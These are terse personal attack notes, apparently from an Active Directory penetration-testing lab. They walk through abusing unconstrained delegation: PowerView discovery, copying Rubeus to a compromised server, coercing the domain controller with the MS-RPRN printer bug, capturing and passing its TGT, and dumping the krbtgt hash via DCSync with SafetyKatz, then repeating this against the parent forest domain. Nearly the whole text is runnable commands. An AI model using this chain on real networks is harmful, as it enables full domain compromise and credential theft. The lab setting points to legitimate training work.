# DISCOVER DOMAIN COMPUTERS WHICH HAVE UNCONTRAINED DELEGATION ENABLED USING PowerView
Get-DomainComputer -UnConstrained


# COMPROMISE THE SERVER(s) WHERE UNCONSTRAINED DELEGATION IS ENABLED
# IN THIS CASE WE COMPROMISED THE ADMINSRV MACHINE AND SAW APPSRV USER HASH WHILE USING MIMIKATZ
# FIND REMOTE LOCAL ADMIN ACCESS
1 - InvisiShell
2 - .\Find-PSRemotingLocalAdminAccess.p1
3 - Find-PSRemotingLocalAdminAccess

# We see dcorp-appsrv machine

# Now copy Rubeus using xcopy and execute it.
C:\Windows\System32> echo F | xcopy C:\AD\Tools\Rubeus.exe \\dcorp-appsrv\c$\Users\Public\Rubeus.exe /Y
winrs -r:dcorp-appsrv cmd
Rubeus.exe monitor /targetuser:dcorp-dc$ /interval:5 /nowrap // RUBEUS IS NOW ON LISTENING MODE

# ON THE STUDENT MACHINE
C:\AD\Tools\MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local

# Even if we get the error we check the cmd where rubeus was listening and grab the TGT of dcorp-dc

# Now we can use that TGT to dump krbtgt hashes with a DCSync attack!!
Rubeus.exe ptt /ticket:<TICKET>

# DCSync
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit" // we can use /all to dump all secrets

******* WE CAN ALSO USE THIS ATTACK IN THE MONEYCORP DOMAIN FOR EXAMPLE *******
C:\Users\Public\Rubeus.exe monitor /targetuser:MCORP-DC$ /interval:5 /nowrap
C:\AD\Tools\MS-RPRN.exe \\mcorp-dc.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
C:\AD\Tools\Rubeus.exe ptt /ticket:<TICKET>
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:mcorp\krbtgt/domain:moneycorp.local" "exit"
WE GOT A DCSYNC OVER THE MCORP DOMAIN GETTING krbtgt ntlm hash
